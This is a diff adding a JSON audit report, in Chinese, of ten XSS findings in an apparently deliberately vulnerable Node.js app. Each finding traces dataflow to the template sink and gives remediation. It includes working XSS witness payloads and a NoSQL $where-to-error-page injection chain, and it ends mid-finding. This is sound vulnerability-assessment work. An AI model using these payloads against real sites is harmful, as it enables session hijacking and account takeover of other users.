@@ -1,0 +1,648 @@
+{
+  "vulnerabilities": [
+    {
+      "ID": "XSS-VULN-01",
+      "title": "存储型 XSS：memo 字段经 marked 渲染注入 GET /memos 页面（memos.html:31）",
+      "vulnerability_type": "Stored",
+      "externally_exploitable": true,
+      "confidence": "High",
+      "severity": "high",
+      "source": "memo (body, POST /memos)",
+      "source_detail": "memosDAO.insert(req.body.memo) at app/data/memos-dao.js:15-24 (stores {memo, timestamp}, no userId); read back via getAllMemos find({}) at app/data/memos-dao.js:26-35 (global, all users)",
+      "path": "POST /memos → addMemos (app/routes/memos.js:11-17, memosDAO.insert(req.body.memo)) → MongoDB memos collection → GET /memos → displayMemos (app/routes/memos.js:19-33, getAllMemos find({})) → res.render(\"memos\", {memosList}) → app/views/memos.html:31 {{ marked(doc.memo) }} → marked 0.3.5 sanitize:true (server.js:126-128) + swig autoescape:false (server.js:137) → raw HTML_BODY",
+      "sink_function": "marked(doc.memo) at app/views/memos.html:31",
+      "render_context": "HTML_BODY",
+      "encoding_observed": "marked 0.3.5 with sanitize:true (server.js:126-128) — legacy regex-based filter, bypassable (allows raw HTML tags/event-handler attributes); swig autoescape globally disabled (server.js:135-142). No other sanitizer.",
+      "mismatch_reason": "marked 0.3.5 的 sanitize 选项是过时的正则过滤而非真正的 HTML 净化器，原样放行 <img src=x onerror=...> 等带事件属性的原始 HTML；且全局 swig autoescape:false 使渲染结果不经任何 HTML 实体编码直接进入 HTML_BODY。",
+      "witness_payload": "<img src=x onerror=alert(document.domain)>",
+      "authentication_required": "true",
+      "accessible_routes": "POST /memos [isLoggedIn] (write)\nGET /memos [isLoggedIn] (trigger)",
+      "endpoints": [
+        "POST /memos (write)",
+        "GET /memos (trigger)"
+      ],
+      "affected_parameters": [
+        "memo (body)"
+      ],
+      "dataflow_steps": [
+        {
+          "label": "读取请求体 memo 并原样写入 DAO",
+          "file": "app/routes/memos.js",
+          "line": 13,
+          "protection": null
+        },
+        {
+          "label": "插入 {memo, timestamp} 到 memos 集合（无 userId 存储）",
+          "file": "app/data/memos-dao.js",
+          "line": 15,
+          "protection": null
+        },
+        {
+          "label": "getAllMemos find({}) 读取全部用户备忘录",
+          "file": "app/data/memos-dao.js",
+          "line": 26,
+          "protection": null
+        },
+        {
+          "label": "渲染 memos 模板并传入 memosList",
+          "file": "app/routes/memos.js",
+          "line": 25,
+          "protection": null
+        },
+        {
+          "label": "marked(doc.memo) 输出到 HTML body（绕过性 sanitizer）",
+          "file": "app/views/memos.html",
+          "line": 31,
+          "protection": "marked 0.3.5 sanitize:true（可绕过）"
+        }
+      ],
+      "impact": "任意登录用户在全局可见的备忘录中植入脚本，任何打开 GET /memos 的用户浏览器中无交互执行，可劫持会话、以受害者身份增删改数据或篡改页面。",
+      "remediation": "在 app/routes/memos.js 写入前用 DOMPurify/sanitize-html 净化 memo，移除 marked 0.3.5 的 sanitize 依赖并升级 marked，同时恢复 server.js:135-142 的 swig autoescape:true。",
+      "cwe_id": "CWE-79",
+      "cvss": "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N 8.1",
+      "owasp_category": "A03:2021-Injection",
+      "notes": "无 CSP（helmet 全部注释 server.js:38-65）。会话 cookie connect.sid 为 express-session 默认 httpOnly=true、Secure 未设置，走明文 HTTP；XSS 无法读 cookie，但可在受害者已认证会话上下文中执行同源请求完成账号接管。memos 全库共享，攻击者发一条备忘录即对所有登录用户生效。"
+    },
+    {
+      "ID": "XSS-VULN-02",
+      "title": "存储型 XSS：匿名注册姓名 firstName/lastName → GET /benefits 用户列表渲染（benefits.html:51-52）",
+      "vulnerability_type": "Stored",
+      "externally_exploitable": true,
+      "confidence": "High",
+      "severity": "high",
+      "source": "firstName / lastName (body, POST /signup)",
+      "source_detail": "userDAO.addUser(userName, firstName, lastName, ...) at app/data/user-dao.js:17-46 stores firstName/lastName from req.body (session.js:189-198); signup validation only length-limited (session.js:163-170 FNAME_RE/LNAME_RE /^.{1,100}$/); read back via benefitsDAO.getAllNonAdminUsers find({isAdmin:{$ne:true}}) at app/data/benefits-dao.js:15-21",
+      "path": "POST /signup (anon) → handleSignup (app/routes/session.js:189-198) → userDAO.addUser (user-dao.js:17-46) → users 集合 → GET /benefits → benefitsHandler.displayBenefits (app/routes/benefits.js:13-27, getAllNonAdminUsers) → res.render(\"benefits\",{users}) → app/views/benefits.html:51-52 {{user.firstName}} {{user.lastName}} → swig autoescape:false → raw HTML_BODY",
+      "sink_function": "Swig {{user.firstName}} / {{user.lastName}} at app/views/benefits.html:51-52",
+      "render_context": "HTML_BODY",
+      "encoding_observed": "None — swig autoescape:false globally (server.js:135-142); signup 只做长度校验不做字符过滤。",
+      "mismatch_reason": "姓名以纯文本存入 users 集合，读取后在 HTML_BODY 上下文直接输出，未做任何 HTML 实体编码；swig autoescape:false 使 <script>/事件属性原样进入页面。写入端匿名可注册，触发端 GET /benefits 因 isAdmin 中间件被注释（index.js:57-60）任何登录用户可访问。",
+      "witness_payload": "<img src=x onerror=alert(document.domain)>",
+      "authentication_required": "true",
+      "accessible_routes": "POST /signup [none] (write)\nGET /benefits [isLoggedIn] (trigger)",
+      "endpoints": [
+        "POST /signup (write)",
+        "GET /benefits (trigger)"
+      ],
+      "affected_parameters": [
+        "firstName (body)",
+        "lastName (body)"
+      ],
+      "dataflow_steps": [
+        {
+          "label": "从 req.body 解构 firstName/lastName 并透传 DAO",
+          "file": "app/routes/session.js",
+          "line": 191,
+          "protection": null
+        },
+        {
+          "label": "users 集合插入姓名（长度校验 /^.{1,100}$/ 可绕过）",
+          "file": "app/data/user-dao.js",
+          "line": 17,
+          "protection": null
+        },
+        {
+          "label": "getAllNonAdminUsers find({isAdmin:{$ne:true}}) 读取全部非管理员",
+          "file": "app/data/benefits-dao.js",
+          "line": 15,
+          "protection": null
+        },
+        {
+          "label": "渲染 benefits 模板传入 users 数组",
+          "file": "app/routes/benefits.js",
+          "line": 19,
+          "protection": null
+        },
+        {
+          "label": "{{user.firstName}}/{{user.lastName}} 原样输出到 HTML body",
+          "file": "app/views/benefits.html",
+          "line": 51,
+          "protection": null
+        }
+      ],
+      "impact": "匿名攻击者注册一个姓名字段带脚本的账号，任何登录用户访问 GET /benefits 即触发脚本执行，实现跨用户存储型 XSS 与账号接管。",
+      "remediation": "恢复 server.js:135-142 的 swig autoescape:true，并在 app/routes/session.js 的 addUser 调用前对 firstName/lastName 做长度+字符白名单校验（拒绝 < > & 等），同时启用 isAdmin 中间件限制 /benefits 访问。",
+      "cwe_id": "CWE-79",
+      "cvss": "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N 8.1",
+      "owasp_category": "A03:2021-Injection",
+      "notes": "写入端 POST /signup 完全匿名（无 auth），触发端 /benefits 需登录（任何登录用户可访问，isAdmin 守卫被注释 index.js:57-60）。同一姓名字段还渲染于 layout.html:75 导航栏（自触发）与 allocations.html:35（见 XSS-VULN-03 相关条目）。无 CSP。"
+    },
+    {
+      "ID": "XSS-VULN-03",
+      "title": "存储型 XSS：POST /profile 姓名更新 → /benefits 与 /allocations/:userId 跨用户渲染",
+      "vulnerability_type": "Stored",
+      "externally_exploitable": true,
+      "confidence": "High",
+      "severity": "high",
+      "source": "firstName / lastName (body, POST /profile)",
+      "source_detail": "profile.updateUser(req.body.firstName/lastName/...) at app/data/profile-dao.js:42-66 stores plaintext; 仅 bankRouting 有校验（profile.js:59-61），firstName/lastName 无字符过滤；读取端 benefits-dao.js:15-21 (getAllNonAdminUsers) 与 allocations-dao.js:97-99 (getUserById 追加 firstName/lastName)",
+      "path": "POST /profile → handleProfileUpdate (app/routes/profile.js:40-51) → profileDAO.updateUser (profile-dao.js:42-66) → users 集合 → GET /benefits → benefits.html:51-52 {{user.firstName}}/{{user.lastName}}（HTML_BODY）；GET /allocations/:userId → allocations-dao.js:97-99 追加姓名 → allocations.html:35 {{allocation.firstName}} {{allocation.lastName}}（HTML_BODY）→ swig autoescape:false",
+      "sink_function": "Swig {{user.firstName}}/{{user.lastName}} at app/views/benefits.html:51-52 与 {{allocation.firstName}} {{allocation.lastName}} at app/views/allocations.html:35",
+      "render_context": "HTML_BODY",
+      "encoding_observed": "None — swig autoescape:false globally (server.js:135-142)；profile-dao 明文存储无净化。",
+      "mismatch_reason": "profile 更新接口只校验 bankRouting 的格式，firstName/lastName 原样写入并原样渲染到其他用户的 /benefits 列表与 /allocations 页面，无 HTML 实体编码；autoescape 关闭导致直接执行。",
+      "witness_payload": "<img src=x onerror=alert(document.domain)>",
+      "authentication_required": "true",
+      "accessible_routes": "POST /profile [isLoggedIn] (write)\nGET /benefits [isLoggedIn] (trigger)\nGET /allocations/:userId [isLoggedIn] (trigger)",
+      "endpoints": [
+        "POST /profile (write)",
+        "GET /benefits (trigger)",
+        "GET /allocations/:userId (trigger)"
+      ],
+      "affected_parameters": [
+        "firstName (body)",
+        "lastName (body)"
+      ],
+      "dataflow_steps": [
+        {
+          "label": "从 req.body 解构姓名并传给 DAO",
+          "file": "app/routes/profile.js",
+          "line": 42,
+          "protection": null
+        },
+        {
+          "label": "updateUser 明文写回 users 集合",
+          "file": "app/data/profile-dao.js",
+          "line": 42,
+          "protection": null
+        },
+        {
+          "label": "getAllNonAdminUsers 读取供 /benefits 渲染",
+          "file": "app/data/benefits-dao.js",
+          "line": 15,
+          "protection": null
+        },
+        {
+          "label": "getUserById 追加 firstName/lastName 供 /allocations 渲染",
+          "file": "app/data/allocations-dao.js",
+          "line": 97,
+          "protection": null
+        },
+        {
+          "label": "benefits.html/allocations.html 原样输出到 HTML body",
+          "file": "app/views/benefits.html",
+          "line": 51,
+          "protection": null
+        }
+      ],
+      "impact": "登录用户可把自己的姓名字段改为恶意脚本，随后任何访问 GET /benefits 或通过 IDOR 访问 GET /allocations/:userId 的用户浏览器执行该脚本，实现跨用户存储型 XSS。",
+      "remediation": "在 app/routes/profile.js 更新前对 firstName/lastName 做字符白名单校验并在恢复 autoescape:true 的模板中输出；删除 profile-dao 明文回写，渲染前统一 HTML 编码。",
+      "cwe_id": "CWE-79",
+      "cvss": "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N 8.1",
+      "owasp_category": "A03:2021-Injection",
+      "notes": "与 XSS-VULN-02 同属姓名字段存储型 XSS，区别在写入源为 POST /profile（需登录）而非匿名注册。GET /allocations/:userId 因 IDOR（allocations.js:16-18 用 req.params.userId）可被任意登录用户查看任意用户的资产页，扩大该姓名的触发面。"
+    },
+    {
+      "ID": "XSS-VULN-04",
+      "title": "存储型 XSS：POST /benefits 任意用户 benefitStartDate 属性注入（benefits.html:57）",
+      "vulnerability_type": "Stored",
+      "externally_exploitable": true,
+      "confidence": "High",
+      "severity": "high",
+      "source": "benefitStartDate (body, POST /benefits)",
+      "source_detail": "benefitsHandler.updateBenefits(req.body.userId, req.body.benefitStartDate) at app/routes/benefits.js:29-35 → benefitsDAO.updateBenefits $set {benefitStartDate} at app/data/benefits-dao.js:23-40（_id: parseInt(userId)，无 admin/归属校验）；渲染端 benefits.html:57 value=\"{{user.benefitStartDate}}\"",
+      "path": "POST /benefits → updateBenefits (app/routes/benefits.js:29-54) → benefitsDAO.updateBenefits $set benefitStartDate (benefits-dao.js:23-40) → users 集合 → 重查询 getAllNonAdminUsers → res.render(\"benefits\") → app/views/benefits.html:57 <input ... value=\"{{user.benefitStartDate}}\"> → swig autoescape:false → HTML_ATTRIBUTE",
+      "sink_function": "Swig value=\"{{user.benefitStartDate}}\" at app/views/benefits.html:57",
+      "render_context": "HTML_ATTRIBUTE",
+      "encoding_observed": "None — swig autoescape:false (server.js:135-142)；benefitStartDate 无格式校验。",
+      "mismatch_reason": "benefitStartDate 原样存入并用双引号 value 属性输出；autoescape 关闭 + 无属性编码，双引号 payload 可跳出属性注入任意标签。写入端 isAdmin 中间件被注释（index.js:57-60），任意登录用户可写任意 userId 的 benefitStartDate。",
+      "witness_payload": "\"><img src=x onerror=alert(document.domain)>",
+      "authentication_required": "true",
+      "accessible_routes": "POST /benefits [isLoggedIn] (write)\nGET /benefits [isLoggedIn] (trigger)",
+      "endpoints": [
+        "POST /benefits (write)",
+        "GET /benefits (trigger)"
+      ],
+      "affected_parameters": [
+        "benefitStartDate (body)",
+        "userId (body)"
+      ],
+      "dataflow_steps": [
+        {
+          "label": "解构 req.body.userId/benefitStartDate 并调 DAO",
+          "file": "app/routes/benefits.js",
+          "line": 30,
+          "protection": null
+        },
+        {
+          "label": "$set benefitStartDate 写入任意 userId（无校验）",
+          "file": "app/data/benefits-dao.js",
+          "line": 23,
+          "protection": null
+        },
+        {
+          "label": "重查询并渲染 benefits 模板",
+          "file": "app/routes/benefits.js",
+          "line": 39,
+          "protection": null
+        },
+        {
+          "label": "value 属性原样输出 benefitStartDate",
+          "file": "app/views/benefits.html",
+          "line": 57,
+          "protection": null
+        }
+      ],
+      "impact": "任意登录用户可为任意其他用户写入恶意 benefitStartDate，所有 /benefits 查看者浏览器触发属性注入脚本，实现跨用户存储型 XSS 与越权写入。",
+      "remediation": "在 app/routes/benefits.js 中对 benefitStartDate 做日期格式校验（如 /^\\d{4}-\\d{2}-\\d{2}$/）并拒绝 < > & \\\" 字符；恢复 isAdmin 中间件（index.js:57-60）限制 /benefits 写入权限；模板恢复 autoescape。",
+      "cwe_id": "CWE-79",
+      "cvss": "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N 8.1",
+      "owasp_category": "A03:2021-Injection",
+      "notes": "写入/触发均需登录（isLoggedIn），但 isAdmin 守卫被注释故任何登录用户可跨用户写入。无 CSP，会话 cookie httpOnly 默认开启但无 Secure、明文传输。"
+    },
+    {
+      "ID": "XSS-VULN-05",
+      "title": "反射型 XSS：GET /allocations/:userId 路径参数注入 form action 与导航 href（allocations.html:15 / layout.html:56）",
+      "vulnerability_type": "Reflected",
+      "externally_exploitable": true,
+      "confidence": "High",
+      "severity": "medium",
+      "source": ":userId (URL path parameter, GET /allocations/:userId)",
+      "source_detail": "allocationsHandler.displayAllocations destructures req.params.userId (app/routes/allocations.js:16-18，会话作用域修复被注释 12-15) 并直接放入渲染上下文 userId（allocations.js:25-29）",
+      "path": "GET /allocations/:userId → displayAllocations (app/routes/allocations.js:11-30) → res.render(\"allocations\", {userId, allocations}) → app/views/allocations.html:15 <form action=\"/allocations/{{userId}}\"> 与 app/views/layout.html:56 href=\"/allocations/{{userId}}\" → swig autoescape:false → HTML_ATTRIBUTE（双引号跳出注入）",
+      "sink_function": "Swig action=\"/allocations/{{userId}}\" at app/views/allocations.html:15 与 href=\"/allocations/{{userId}}\" at app/views/layout.html:56",
+      "render_context": "HTML_ATTRIBUTE",
+      "encoding_observed": "None — 路径参数原样透传；swig autoescape:false (server.js:135-142)。",
+      "mismatch_reason": "req.params.userId 未经任何编码直接内插进双引号属性，payload 中的 \"> 即可闭合属性与标签注入事件处理器/脚本；IDOR 修复被注释使该参数完全由 URL 控制。",
+      "witness_payload": "\"><img src=x onerror=alert(document.domain)>",
+      "authentication_required": "true",
+      "accessible_routes": "GET /allocations/:userId [isLoggedIn] (trigger; 同一 userId 同时注入 allocations.html:15 与 layout.html:56)",
+      "endpoints": [
+        "GET /allocations/:userId (trigger)"
+      ],
+      "affected_parameters": [
+        "userId (path)"
+      ],
+      "dataflow_steps": [
+        {
+          "label": "从 req.params 解构 userId（会话修复被注释）",
+          "file": "app/routes/allocations.js",
+          "line": 16,
+          "protection": null
+        },
+        {
+          "label": "userId 直接进入渲染上下文",
+          "file": "app/routes/allocations.js",
+          "line": 25,
+          "protection": null
+        },
+        {
+          "label": "form action 属性原样输出 userId",
+          "file": "app/views/allocations.html",
+          "line": 15,
+          "protection": null
+        },
+        {
+          "label": "导航 href 属性原样输出 userId",
+          "file": "app/views/layout.html",
+          "line": 56,
+          "protection": null
+        }
+      ],
+      "impact": "登录受害者点击构造链接 /allocations/\"><img...> 即在其会话上下文执行脚本；同时该路径参数可枚举读取任意用户资产数据（IDOR），放大了跨用户影响。",
+      "remediation": "在 app/routes/allocations.js:16-18 改从 req.session.userId 取值（启用被注释的会话作用域修复），并在模板恢复 autoescape 或在插入前对 userId 做 URL/属性编码。",
+      "cwe_id": "CWE-79",
+      "cvss": "AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N 7.1",
+      "owasp_category": "A03:2021-Injection",
+      "notes": "反射型 XSS，需登录受害者点击链接触发；无 CSP 放大了影响。同一参数同时命中两处属性 sink。"
+    },
+    {
+      "ID": "XSS-VULN-06",
+      "title": "反射型 XSS：POST /login 用户名回显到 value 属性（login.html:110）",
+      "vulnerability_type": "Reflected",
+      "externally_exploitable": true,
+      "confidence": "High",
+      "severity": "medium",
+      "source": "userName (body, POST /login)",
+      "source_detail": "handleLoginRequest 在登录失败分支把 req.body.userName 原样传入 res.render(\"login\", {userName, ...}) at app/routes/session.js:82-98",
+      "path": "POST /login → handleLoginRequest (app/routes/session.js:53-119) → 用户名/密码校验失败 → res.render(\"login\", {userName: req.body.userName, password:\"\", ...}) (session.js:82-98) → app/views/login.html:110 value=\"{{userName}}\" → swig autoescape:false → HTML_ATTRIBUTE",
+      "sink_function": "Swig value=\"{{userName}}\" at app/views/login.html:110",
+      "render_context": "HTML_ATTRIBUTE",
+      "encoding_observed": "None — 失败分支原样回显 userName；swig autoescape:false (server.js:135-142)。",
+      "mismatch_reason": "登录失败时把攻击者可控的 userName 直接内插进双引号 value 属性且无属性编码，payload 中的 \"> 可闭合属性并注入事件处理器或脚本标签。",
+      "witness_payload": "\"><svg/onload=alert(document.domain)>",
+      "authentication_required": "false",
+      "accessible_routes": "POST /login [none] (trigger)",
+      "endpoints": [
+        "POST /login (trigger)"
+      ],
+      "affected_parameters": [
+        "userName (body)"
+      ],
+      "dataflow_steps": [
+        {
+          "label": "从 req.body 解构 userName",
+          "file": "app/routes/session.js",
+          "line": 54,
+          "protection": null
+        },
+        {
+          "label": "校验失败分支原样回显 userName",
+          "file": "app/routes/session.js",
+          "line": 82,
+          "protection": null
+        },
+        {
+          "label": "value 属性原样输出 userName",
+          "file": "app/views/login.html",
+          "line": 110,
+          "protection": null
+        }
+      ],
+      "impact": "未认证攻击者构造带 payload 的用户名使受害者提交登录表单，错误重渲染即在登录页执行脚本；结合无 CSRF 防护可用自动提交表单诱使受害者浏览器触发。",
+      "remediation": "在 app/routes/session.js:82-98 渲染前对 userName 做 HTML 属性编码（或恢复 swig autoescape:true），避免把用户输入写回 value 属性。",
+      "cwe_id": "CWE-79",
+      "cvss": "AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N 6.1",
+      "owasp_category": "A03:2021-Injection",
+      "notes": "POST /login 完全匿名可达；需受害者实际提交该用户名（钓鱼/CSRF 自动提交表单诱导）。loginError 为静态字符串不可控。"
+    },
+    {
+      "ID": "XSS-VULN-07",
+      "title": "反射型 XSS：POST /signup 用户名回显到 value 属性（signup.html:75）",
+      "vulnerability_type": "Reflected",
+      "externally_exploitable": true,
+      "confidence": "High",
+      "severity": "medium",
+      "source": "userName (body, POST /signup)",
+      "source_detail": "handleSignup 在注册校验失败/重名失败时把 req.body.userName 放入 errors 对象并 res.render(\"signup\", {...errors}) at app/routes/session.js:201-204, 214-217, 249-252",
+      "path": "POST /signup → handleSignup (app/routes/session.js:189-254) → 校验失败/重名 → res.render(\"signup\", {userName, email, ...}) → app/views/signup.html:75 value=\"{{userName}}\" → swig autoescape:false → HTML_ATTRIBUTE",
+      "sink_function": "Swig value=\"{{userName}}\" at app/views/signup.html:75",
+      "render_context": "HTML_ATTRIBUTE",
+      "encoding_observed": "None — 失败分支原样回显 userName；swig autoescape:false (server.js:135-142)。",
+      "mismatch_reason": "注册失败时把攻击者可控 userName 内插进双引号 value 属性且无编码，\"> 跳出属性注入脚本。",
+      "witness_payload": "\"><img src=x onerror=alert(document.domain)>",
+      "authentication_required": "false",
+      "accessible_routes": "POST /signup [none] (trigger)",
+      "endpoints": [
+        "POST /signup (trigger)"
+      ],
+      "affected_parameters": [
+        "userName (body)"
+      ],
+      "dataflow_steps": [
+        {
+          "label": "从 req.body 解构 userName",
+          "file": "app/routes/session.js",
+          "line": 191,
+          "protection": null
+        },
+        {
+          "label": "错误分支把 userName 写入 errors 对象",
+          "file": "app/routes/session.js",
+          "line": 201,
+          "protection": null
+        },
+        {
+          "label": "value 属性原样输出 userName",
+          "file": "app/views/signup.html",
+          "line": 75,
+          "protection": null
+        }
+      ],
+      "impact": "匿名攻击者构造带 payload 的注册用户名，受害者提交注册表单即触发 signup 页脚本执行（可配合自动提交表单诱导），实现反射型 XSS。",
+      "remediation": "在 app/routes/session.js:249-252 渲染前对 userName 做属性编码（或恢复 autoescape:true），校验失败时不要把原始输入写回 value。",
+      "cwe_id": "CWE-79",
+      "cvss": "AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N 6.1",
+      "owasp_category": "A03:2021-Injection",
+      "notes": "匿名可达；触发需受害者提交该注册表单。firstName/lastName/password/verify 在错误分支不回显（errors 只含 userName/email）。"
+    },
+    {
+      "ID": "XSS-VULN-08",
+      "title": "反射型 XSS：POST /signup 邮箱回显到 value 属性（signup.html:102）",
+      "vulnerability_type": "Reflected",
+      "externally_exploitable": true,
+      "confidence": "High",
+      "severity": "medium",
+      "source": "email (body, POST /signup)",
+      "source_detail": "handleSignup 在注册校验失败/重名失败时把 req.body.email 放入 errors 对象并 res.render(\"signup\", {...errors}) at app/routes/session.js:201-204, 249-252",
+      "path": "POST /signup → handleSignup (app/routes/session.js:189-254) → 校验失败 → res.render(\"signup\", {userName, email, ...}) → app/views/signup.html:102 value=\"{{email}}\" → swig autoescape:false → HTML_ATTRIBUTE",
+      "sink_function": "Swig value=\"{{email}}\" at app/views/signup.html:102",
+      "render_context": "HTML_ATTRIBUTE",
+      "encoding_observed": "None — 失败分支原样回显 email；swig autoescape:false (server.js:135-142)。",
+      "mismatch_reason": "注册失败时把攻击者可控 email 内插进双引号 value 属性且无属性编码，\"> 跳出属性注入脚本。",
+      "witness_payload": "\"><img src=x onerror=alert(document.domain)>",
+      "authentication_required": "false",
+      "accessible_routes": "POST /signup [none] (trigger)",
+      "endpoints": [
+        "POST /signup (trigger)"
+      ],
+      "affected_parameters": [
+        "email (body)"
+      ],
+      "dataflow_steps": [
+        {
+          "label": "从 req.body 解构 email",
+          "file": "app/routes/session.js",
+          "line": 191,
+          "protection": null
+        },
+        {
+          "label": "错误分支把 email 写入 errors 对象",
+          "file": "app/routes/session.js",
+          "line": 201,
+          "protection": null
+        },
+        {
+          "label": "value 属性原样输出 email",
+          "file": "app/views/signup.html",
+          "line": 102,
+          "protection": null
+        }
+      ],
+      "impact": "匿名攻击者构造带 payload 的邮箱字段，受害者提交注册表单即触发 signup 页脚本执行，实现反射型 XSS。",
+      "remediation": "在 app/routes/session.js:249-252 渲染前对 email 做属性编码（或恢复 autoescape:true），校验失败时不要写回原始输入。",
+      "cwe_id": "CWE-79",
+      "cvss": "AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N 6.1",
+      "owasp_category": "A03:2021-Injection",
+      "notes": "匿名可达；与 XSS-VULN-07 同源不同参数（email vs userName）独立 sink（signup.html:102 vs 75）。"
+    },
+    {
+      "ID": "XSS-VULN-09",
+      "title": "反射型 XSS：POST /profile 校验失败重渲染原始字段到 value 属性与 javascript: href（profile.html:41-78）",
+      "vulnerability_type": "Reflected",
+      "externally_exploitable": true,
+      "confidence": "High",
+      "severity": "medium",
+      "source": "firstName / lastName / ssn / dob / address / bankAcc / bankRouting (body, POST /profile)",
+      "source_detail": "handleProfileUpdate 在 bankRouting 校验失败分支（profile.js:63-76）把 req.body 解构出的原始字段直接传入 res.render(\"profile\", {firstNameSafeString: firstName, lastName, ssn, dob, address, bankAcc, bankRouting})；firstNameSafeString = firstName 未经任何编码（profile.js:64）",
+      "path": "POST /profile → handleProfileUpdate (app/routes/profile.js:40-76) → bankRouting 未通过 /([0-9]+)+#/ (profile.js:59-61) → res.render(\"profile\", {firstNameSafeString, lastName, ssn, dob, address, bankAcc, bankRouting}) → app/views/profile.html:41/45/49/53/57/61/66 value=\"{{...}}\"（HTML_ATTRIBUTE）与 profile.html:78 <a href=\"{{firstNameSafeString}}\">（URL_PARAM，javascript: URL）→ swig autoescape:false",
+      "sink_function": "Swig value=\"{{firstNameSafeString/lastName/ssn/dob/address/bankAcc/bankRouting}}\" at app/views/profile.html:41-66（HTML_ATTRIBUTE）与 <a href=\"{{firstNameSafeString}}\"> at profile.html:78（URL_PARAM）",
+      "render_context": "HTML_ATTRIBUTE",
+      "encoding_observed": "仅 GET 路径对 doc.website 做 ESAPI.encodeForHTML（profile.js:28，属于错误上下文的编码，且不影响 POST 错误分支）；POST 错误分支所有字段零编码；swig autoescape:false (server.js:135-142)。",
+      "mismatch_reason": "校验失败时把原始请求体字段直接写回 value 属性（双引号跳出）并把 firstNameSafeString 原样放入 href（javascript: 协议 URL 未被阻止），上下文应有的属性编码/URL 校验均缺失。",
+      "witness_payload": "\"><img src=x onerror=alert(document.domain)>",
+      "authentication_required": "true",
+      "accessible_routes": "POST /profile [isLoggedIn] (trigger)",
+      "endpoints": [
+        "POST /profile (trigger)"
+      ],
+      "affected_parameters": [
+        "firstName (body)",
+        "lastName (body)",
+        "ssn (body)",
+        "dob (body)",
+        "address (body)",
+        "bankAcc (body)",
+        "bankRouting (body)"
+      ],
+      "dataflow_steps": [
+        {
+          "label": "从 req.body 解构全部个人资料字段",
+          "file": "app/routes/profile.js",
+          "line": 42,
+          "protection": null
+        },
+        {
+          "label": "bankRouting 正则校验失败进入错误分支",
+          "file": "app/routes/profile.js",
+          "line": 63,
+          "protection": null
+        },
+        {
+          "label": "firstNameSafeString = 原始 firstName（无编码）",
+          "file": "app/routes/profile.js",
+          "line": 64,
+          "protection": null
+        },
+        {
+          "label": "value 属性原样输出各字段",
+          "file": "app/views/profile.html",
+          "line": 41,
+          "protection": null
+        },
+        {
+          "label": "href 原样输出 firstNameSafeString（javascript: URL）",
+          "file": "app/views/profile.html",
+          "line": 78,
+          "protection": null
+        }
+      ],
+      "impact": "攻击者构造带 payload 的字段并通过自动提交表单（无 CSRF 防护）使受害者 POST /profile，错误重渲染即在受害者会话上下文执行脚本；firstName=javascript:alert(1) 亦可经 href 链接触发。",
+      "remediation": "在 app/routes/profile.js:63-76 错误分支渲染前对所有回显字段做 HTML 属性编码，并将 href 改为使用独立、经 URL 协议白名单校验的变量（启用注释中的 firstNameSafeURLString 思路），避免把用户输入放入 href。",
+      "cwe_id": "CWE-79",
+      "cvss": "AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N 7.1",
+      "owasp_category": "A03:2021-Injection",
+      "notes": "该接口无 CSRF（csurf 被注释 server.js:104-113），可用跨站自动提交表单诱导受害者触发。另有同源存储型自 XSS：合法更新后 GET /profile 原样回显 lastName/ssn/dob/address/bankAcc/bankRouting 到 value 属性（仅本人可见，低价值）。"
+    },
+    {
+      "ID": "XSS-VULN-10",
+      "title": "错误页反射型 XSS：{{error}} 未编码渲染，经 /allocations $where 错误消息回显注入（error-template.html:11）",
+      "vulnerability_type": "Reflected",
+      "externally_exploitable": true,
+      "confidence": "Medium",
+      "severity": "medium",
+      "source": "threshold (query, GET /allocations/:userId) 经 NoSQL $where 错误消息回显",
+      "source_detail": "allocations-dao.js:77-79 用字符串插值构造 $where: `this.userId == ${parsedUserId} && this.stocks > '${threshold}'`；恶意 threshold 导致 Mongo 求值错误时错误消息包含原始 $where 片段；错误经 allocations.js:23-24 next(err) → error.js:10-12 res.render(\"error-template\", {error: err}) → error-template.html:11 {{error}}",
+      "path": "GET /allocations/:userId?threshold=<malformed JS> → allocations-dao.js:78 插值进 $where → MongoDB $where 求值报错，错误消息含攻击者 threshold 片段 → callback(err) → allocations.js:24 next(err) → 全局错误中间件 error.js:10-12 → res.render(\"error-template\", {error: err}) → error-template.html:11 {{error}} 未编码输出 HTML_BODY",
+      "sink_function": "Swig {{error}} at app/views/error-template.html:11（String(err) 含 err.message）",
+      "render_context": "HTML_BODY",
+      "encoding_observed": "None — 完整 Error 对象透传模板，swig autoescape:false (server.js:135-142)。",
+      "mismatch_reason": "错误对象整体未编码渲染进 HTML body；当错误消息嵌入攻击者可控的 threshold（$where 字符串插值）时，payload 以 HTML 形式原样执行。利用成功率依赖 MongoDB 错误消息是否包含原始求值代码，置信度为中。",
+      "witness_payload": "1';<img src=x onerror=alert(document.domain)>'",
+      "authentication_required": "true",
+      "accessible_routes": "GET /allocations/:userId [isLoggedIn] (trigger)\nPOST /contributions [isLoggedIn] (候选触发：eval SyntaxError，见 notes)",
+      "endpoints": [
+        "GET /allocations/:userId (trigger)",
+        "POST /contributions (trigger, 弱)"
+      ],
+      "affected_parameters": [
+        "threshold (query)"
+      ],
+      "dataflow_steps": [
+        {
+          "label": "threshold 原样插值进 $where 字符串",
+          "file": "app/data/allocations-dao.js",
+          "line": 78,
+          "protection": null
+        },
+        {
+          "label": "MongoDB $where 求值错误返回含注入片段的错误",
+          "file": "app/data/allocations-dao.js",
+          "line": 86,
+          "protection": null
+        },
+        {
+          "label": "错误上抛到全局错误中间件",
+          "file": "app/routes/allocations.js",
+          "line": 24,
+          "protection": null
+        },
+        {
+          "label": "完整 Error 对象传入 error-template",
+          "file": "app/routes/error.js",
+          "line": 10,
+          "protection": null
+        },
+        {
+          "label": "{{error}} 未编码输出到 HTML body",
+          "file": "app/views/error-template.html",
+          "line": 11,
+          "protection": null
+        }
+      ],
+      "impact": "攻击者构造含 HTML payload 的 threshold 参数使 $where 求值报错，错误页即以受害者会话上下文执行脚本；同时该 sink 使任何嵌入用户输入的服务器错误都成为 XSS 反射面。",
